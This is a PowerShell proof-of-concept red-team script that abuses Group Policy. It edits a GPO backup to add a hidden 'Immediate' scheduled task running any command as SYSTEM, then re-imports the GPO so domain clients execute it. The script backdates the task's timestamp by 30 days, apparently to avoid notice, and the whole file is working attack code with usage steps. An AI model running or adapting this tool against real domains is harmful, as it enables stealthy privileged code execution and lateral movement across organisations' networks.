#requires -version 2

<#
    New-GPOImmediateTask.ps1
    Version: v1.0(POC)
    Author:  3gstudent(@3gstudent)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
    Reference:http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/
    Maybe I can solve the problem in harmj0y' blog.
    Need more test.
#>

function New-GPOImmediateTask {
<#
    .SYNOPSIS
        Builds an 'Immediate' schtask to push out through a specified GPO.
        Because I haven't found out how to register the 'Immediate' schtask yet.
        So I have to backup the gpo,then modify the Backup.xml and gpreport.xml,and finally import the gpo.
                
        (1)Create a gpo
            new-gpo -name TestGPO | new-gplink -Target "dc=test,dc=com"
        (2)Backup the gpo and get the BackupId and GPOId
            $Backup = Backup-Gpo -Name TestGPO -Path C:\test1
            $BackupId = $Backup.Id
            $GPOId = $Backup.GpoId
        (3)Use New-GPOImmediateTask.ps1 to modify the Backup.xml and gpreport.xml,and finally import the gpo.   
            New-GPOImmediateTask -TaskName Debugging -BackupId 2dd64ebc-2b8b-403b-8b2d-8fd4c5711ba7 -BackupPath c:\test1 -GPOId 5fdfab7c-0bfe-4aec-983e-4d3db3003ce0 -SysPath '\\dc1.test.com\sysvol\test.com' -GPODisplayName TestGPO -CommandArguments '-c "123 | Out-File C:\test\debug.txt"'
        (4)You can force the client to refresh the gpo:
            Invoke-GPUpdate -Computer "TEST\COMPUTER-01"
           Or you can wait 90 minutes,the client's gpo will refresh automatically. 
         
    .PARAMETER TaskName
        Name for the schtask to create. Required.        
    .PARAMETER BackupId
        BackupId of the gpo. Required.
    .PARAMETER GPOId
        GPOId of the gpo. Required.
        You can get BackupId and GPOId when you backup the gpo.
        eg.
            $Backup = Backup-Gpo -Name TestGPO -Path C:\test1
            $BackupId = $Backup.Id
            $GPOId = $Backup.GpoId                           
    .PARAMETER BackupPath
        Backup path of the gpo. Required.
    .PARAMETER SysPath
        '\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\<DOMAIN>'. Required.        
    .PARAMETER GPODisplayName
        The GPO display name to build the task for. Required.
    .PARAMETER Command
        The command to execute with the task, defaults to 'powershell'. Required.
    .PARAMETER CommandArguments
        The arguments to supply to the -Command being launched. Required.
               
    .EXAMPLE
        PS> New-GPOImmediateTask -TaskName Debugging -BackupId 2dd64ebc-2b8b-403b-8b2d-8fd4c5711ba7 -BackupPath c:\test1 -GPOId 5fdfab7c-0bfe-4aec-983e-4d3db3003ce0 -SysPath '\\dc1.test.com\sysvol\test.com' -GPODisplayName TestGPO -CommandArguments '-c "123 | Out-File C:\test\debug.txt"'
        Create an immediate schtask(Debugging) of the GPO(TestGPO) that executes the specified PowerShell arguments.
#>
    [CmdletBinding()]
           
    Param (
        [Parameter(Mandatory = $True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $TaskName,

        [String]
        [ValidateNotNullOrEmpty()]
        $BackupId,
        
        [String]
        [ValidateNotNullOrEmpty()]
        $BackupPath,        
        
        [String]
        [ValidateNotNullOrEmpty()]
        $GPOId,

        [String]
        [ValidateNotNullOrEmpty()]
        $SysPath,
                
        [String]
        [ValidateNotNullOrEmpty()]
        $Command = 'powershell',

        [String]
        [ValidateNotNullOrEmpty()]
        $CommandArguments,

        [String]
        $GPODisplayName
    )

    $TaskAuthor = 'NT AUTHORITY\System'
    $TaskModifiedDate = (Get-Date (Get-Date).AddDays(-30) -Format u).trim("Z")
 

    Write-Host "[*] TaskName:        "$TaskName
    Write-Host "[*] BackupId:        "$BackupId 
    Write-Host "[*] BackupPath:      "$BackupPath
    Write-Host "[*] GPOId:           "$GPOId 
    Write-Host "[*] SysPath:         "$SysPath
    Write-Host "[*] Command:         "$Command
    Write-Host "[*] CommandArguments:"$CommandArguments
    Write-Host "[*] TaskModifiedDate:"$TaskModifiedDate
    Write-Host "[*] GPODisplayName:  "$GPODisplayName
   
    Write-Host "--------------------------------------"
    $BackupxmlPath = $BackupPath + '\{' + $BackupId + '}\Backup.xml'
    Write-Host "[+] BackupxmlPath: "$BackupxmlPath
    
    $GpreportPath = $BackupPath + '\{' + $BackupId + '}\gpreport.xml'
    Write-Host "[+] GpreportPath : "$GpreportPath
    Write-Host "--------------------------------------"
           
    Write-Host "[+] Start to modify Backup.xml"
       
    $Content1 = Get-Content $BackupxmlPath
    
    $String1 = "<UserExtensionGuids/>"
    $String2 = "<UserExtensionGuids><![CDATA[[{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}][{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]]]></UserExtensionGuids>"
  
    $Content1 = $Content1.replace($String1,$String2) 
    
    
    $String3 = 'bkp:DescName="Unknown Extension"><FSObjectDir bkp:Path="%GPO_USER_FSPATH%\Preferences" bkp:SourceExpandedPath="\\dc.test.com\sysvol\test.com\Policies\{2DA44238-84D1-4AAC-A3A1-42FE8EB1B4BD}\User\Preferences" bkp:Location="DomainSysvol\GPO\User\Preferences"/><FSObjectDir bkp:Path="%GPO_USER_FSPATH%\Preferences\ScheduledTasks" bkp:SourceExpandedPath="\\dc.test.com\sysvol\test.com\Policies\{2DA44238-84D1-4AAC-A3A1-42FE8EB1B4BD}\User\Preferences\ScheduledTasks" bkp:Location="DomainSysvol\GPO\User\Preferences\ScheduledTasks"/><FSObjectFile bkp:Path="%GPO_USER_FSPATH%\Preferences\ScheduledTasks\ScheduledTasks.xml" bkp:SourceExpandedPath="\\dc.test.com\sysvol\test.com\Policies\{2DA44238-84D1-4AAC-A3A1-42FE8EB1B4BD}\User\Preferences\ScheduledTasks\ScheduledTasks.xml" bkp:Location="DomainSysvol\GPO\User\Preferences\ScheduledTasks\ScheduledTasks.xml"/></GroupPolicyExtension>'
    
    $String3 = $String3.replace("\\dc.test.com\sysvol\test.com",$SysPath)
    $String3 = $String3.replace("2DA44238-84D1-4AAC-A3A1-42FE8EB1B4BD",$GPOId)
    
    $Content1 = $Content1.replace('bkp:DescName="Unknown Extension"/>',$String3)
    
    $Content1 | Set-Content -Encoding ASCII -Path $BackupxmlPath
    Write-Host "[+] Success"   
                                     
    if(Test-Path $GpreportPath) 
    {
        Write-Host "[+] Start to modify gpreport.xml"
        $Content2 = Get-Content $GpreportPath
              
        $Content2 = $Content2.replace("<VersionDirectory>0</VersionDirectory>","<VersionDirectory>6</VersionDirectory>")          
        $Content2 = $Content2.replace("<VersionSysvol>0</VersionSysvol>","<VersionSysvol>6</VersionSysvol>")      
       
        $Newguid = [guid]::NewGuid()
        
        $tempdata1 = @"
    <Enabled>true</Enabled>        
<ExtensionData>
      <Extension xmlns:q1="http://www.microsoft.com/GroupPolicy/Settings/ScheduledTasks" xsi:type="q1:ScheduledTasksSettings">
        <q1:ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}">
          <q1:ImmediateTaskV2 clsid="{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}" name="Debugging" image="0" changed="2018-11-11 11:11:11" uid="{C3030B43-D3F5-480C-9393-7E252EBA6229}" userContext="0" removePolicy="0">
            <q1:GPOSettingOrder>1</q1:GPOSettingOrder>
            <q1:Properties action="C" name="Debugging" runAs="NT AUTHORITY\System" logonType="InteractiveToken">
              <q1:Task version="1.3">
                <q1:RegistrationInfo>
                  <q1:Author>NT AUTHORITY\System</q1:Author>
                  <q1:Description />
                </q1:RegistrationInfo>
                <q1:Triggers>
                  <q1:TimeTrigger>
                    <q1:Enabled>true</q1:Enabled>
                    <q1:StartBoundary>%LocalTimeXmlEx%</q1:StartBoundary>
                    <q1:EndBoundary>%LocalTimeXmlEx%</q1:EndBoundary>
                  </q1:TimeTrigger>
                </q1:Triggers>
                <q1:Settings>
                  <q1:AllowStartOnDemand>false</q1:AllowStartOnDemand>
                  <q1:DisallowStartIfOnBatteries>false</q1:DisallowStartIfOnBatteries>
                  <q1:StopIfGoingOnBatteries>true</q1:StopIfGoingOnBatteries>
                  <q1:AllowHardTerminate>false</q1:AllowHardTerminate>
                  <q1:StartWhenAvailable>true</q1:StartWhenAvailable>
                  <q1:Enabled>true</q1:Enabled>
                  <q1:Hidden>true</q1:Hidden>
                  <q1:DeleteExpiredTaskAfter>PT0S</q1:DeleteExpiredTaskAfter>
                  <q1:MultipleInstancesPolicy>IgnoreNew</q1:MultipleInstancesPolicy>
                  <q1:Priority>7</q1:Priority>
                  <q1:ExecutionTimeLimit>PT0S</q1:ExecutionTimeLimit>
                  <q1:IdleSettings>
                    <q1:Duration>PT10M</q1:Duration>
                    <q1:WaitTimeout>PT1H</q1:WaitTimeout>
                    <q1:StopOnIdleEnd>true</q1:StopOnIdleEnd>
                    <q1:RestartOnIdle>false</q1:RestartOnIdle>
                  </q1:IdleSettings>
                  <q1:RestartOnFailure>
                    <q1:Interval>PT15M</q1:Interval>
                    <q1:Count>3</q1:Count>
                  </q1:RestartOnFailure>
                </q1:Settings>
                <q1:Principals>
                  <q1:Principal id="Author">
                    <q1:UserId>NT AUTHORITY\System</q1:UserId>
                    <q1:LogonType>InteractiveToken</q1:LogonType>
                    <q1:RunLevel>HighestAvailable</q1:RunLevel>
                  </q1:Principal>
                </q1:Principals>
                <q1:Actions>
                  <q1:Exec>
                    <q1:Command>powershell</q1:Command>
                    <q1:Arguments>-c "123 | Out-File C:\test\debugaa.txt"</q1:Arguments>
                  </q1:Exec>
                </q1:Actions>
              </q1:Task>
            </q1:Properties>
            <q1:Filters />
          </q1:ImmediateTaskV2>
        </q1:ScheduledTasks>
      </Extension>
      <Name>Scheduled Tasks</Name>
    </ExtensionData>
  </User>
"@

        $tempdata1 = $tempdata1.replace("Debugging",$TaskName)
        $tempdata1 = $tempdata1.replace("2018-11-11 11:11:11",$TaskModifiedDate)
        $tempdata1 = $tempdata1.replace("{C3030B43-D3F5-480C-9393-7E252EBA6229}",$Newguid)
        $tempdata1 = $tempdata1.replace("powershell",$Command)
        $tempdata1 = $tempdata1.replace('-c "123 | Out-File C:\test\debug.txt"',$CommandArguments)
        
        $Content2 = $Content2.replace("</User>",$tempdata1)
                         
        $Content2 | Set-Content -Encoding Unicode -Path $GpreportPath
    }
    
    Write-Host "[+] Start to generate ScheduledTasks.xml"

    $TaskXML = '<?xml version="1.0" encoding="utf-8"?><ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}"><ImmediateTaskV2 clsid="{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}" name="'+$TaskName+'" image="0" changed="'+$TaskModifiedDate+'" uid="{'+$Newguid+'}" userContext="0" removePolicy="0"><Properties action="C" name="'+$TaskName+'" runAs="NT AUTHORITY\System" logonType="InteractiveToken"><Task version="1.3"><RegistrationInfo><Author>'+$TaskAuthor+'</Author><Description>'+$TaskDescription+'</Description></RegistrationInfo><Principals><Principal id="Author"><UserId>NT AUTHORITY\System</UserId><RunLevel>HighestAvailable</RunLevel><LogonType>InteractiveToken</LogonType></Principal></Principals><Settings><IdleSettings><Duration>PT10M</Duration><WaitTimeout>PT1H</WaitTimeout><StopOnIdleEnd>true</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>true</StopIfGoingOnBatteries><AllowHardTerminate>false</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><AllowStartOnDemand>false</AllowStartOnDemand><Enabled>true</Enabled><Hidden>true</Hidden><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Priority>7</Priority><DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter><RestartOnFailure><Interval>PT15M</Interval><Count>3</Count></RestartOnFailure></Settings><Actions Context="Author"><Exec><Command>'+$Command+'</Command><Arguments>'+$CommandArguments+'</Arguments></Exec></Actions><Triggers><TimeTrigger><StartBoundary>%LocalTimeXmlEx%</StartBoundary><EndBoundary>%LocalTimeXmlEx%</EndBoundary><Enabled>true</Enabled></TimeTrigger></Triggers></Task></Properties></ImmediateTaskV2></ScheduledTasks>'

    $TaskXMLParentPath = $BackupPath + '\{' + $BackupId + '}\DomainSysvol\GPO\User\Preferences\ScheduledTasks'    
    md $TaskXMLParentPath -ErrorAction SilentlyContinue | Out-Null
    $TaskXMLPath = $TaskXMLParentPath + '\ScheduledTasks.xml'
    
    $TaskXML | Set-Content -Encoding ASCII -Path $TaskXMLPath

    Write-Host "[+] Start to import the gpo"   
    Import-GPO -BackupId $BackupId -TargetName $GPODisplayName -Path $BackupPath | Out-Null

    Write-Host "[+] All done."      
}
